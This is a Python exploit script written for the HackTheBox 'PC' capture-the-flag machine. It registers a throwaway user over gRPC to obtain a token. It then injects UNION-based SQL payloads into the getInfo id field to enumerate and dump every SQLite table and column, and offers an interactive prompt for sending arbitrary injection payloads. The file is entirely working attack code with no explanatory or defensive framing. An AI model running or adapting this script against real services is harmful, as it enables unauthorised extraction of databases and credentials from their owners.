#!/usr/bin/env python3
from argparse import ArgumentParser
from grpc import insecure_channel, _channel
from uuid import uuid4
from json import dumps
from pc_pb2_grpc import SimpleAppStub
from pc_pb2 import LoginUserRequest, getInfoRequest

def getArguments():
    parser = ArgumentParser(description="Tool exploiting HackTheBox PC gRPC")
    parser.add_argument("-t", "--target", required=True, help="Target host")
    parser.add_argument("-p", "--port", required=False, type=int, default=50051, help="Target port (default: 50051)")
    parser.add_argument("-i", "--interactive", action="store_true", help="Interactively send payload to injectable query")
    return parser.parse_args()

def getValidToken(stub: SimpleAppStub) -> str:
    username = uuid4().hex
    password = uuid4().hex
    user = LoginUserRequest(username=username, password=password)

    stub.RegisterUser(user)
    response, call = stub.LoginUser.with_call(user)
    _, token = call.trailing_metadata()[0]
    return token[2:-1] # Remove the b' and ' from the token string

def sendGetInfoPayload(stub: SimpleAppStub, token: str, payload: str) -> str:
    data = (("token", token),)
    response = stub.getInfo(request=getInfoRequest(id=payload), metadata=data)
    result = str(response).replace("message:", "").strip()
    return result[1:-1] # Removes the double quotes

def executeQuery(stub: SimpleAppStub, token: str, query: str) -> list:
    result = []
    offset = 0
    while True:
        payload = f"0 UNION {query} limit 1 offset {offset}"
        try:
            output = sendGetInfoPayload(stub, token, payload)
            result.append(output)
        except _channel._InactiveRpcError:
            break
        offset += 1
    return result

def startInteractivePayload(stub: SimpleAppStub, token: str):
    print("Press Ctrl+C to quit")
    while True:
        payload = input("id: ")
        try:
            result = sendGetInfoPayload(stub, token, payload)
            print(result)
        except _channel._InactiveRpcError as err:
            print(f"Error: {err.details()}")

def enumerateTable(stub: SimpleAppStub, token: str, table: str) -> dict:
    result = {}
    columns = executeQuery(stub, token, f"select col.name from pragma_table_info('{table}') col")
    for column in columns:
        columnContent = executeQuery(stub, token, f"select {column} from {table}")
        result[column] = columnContent
    return result

def enumerateDatabase(stub: SimpleAppStub, token: str) -> dict:
    result = {}
    result["version"] = executeQuery(stub, token, "select sqlite_version()")
    
    tables = executeQuery(stub, token, "select tbl_name from sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'")
    tableResults = {}
    for table in tables:
        tableContent = enumerateTable(stub, token, table)
        tableResults[table] = tableContent
    result["tables"] = tableResults
    return result

def main():
    args = getArguments()
    url = f"{args.target}:{args.port}"
    with insecure_channel(url) as channel:
        stub = SimpleAppStub(channel)
        token = getValidToken(stub)

        if args.interactive:
            try:
                startInteractivePayload(stub, token)
            except KeyboardInterrupt:
                print("\nQuitting..")
                return
        
        result = enumerateDatabase(stub, token)
        print(dumps(result, indent=2))

if __name__ == "__main__":
    main()
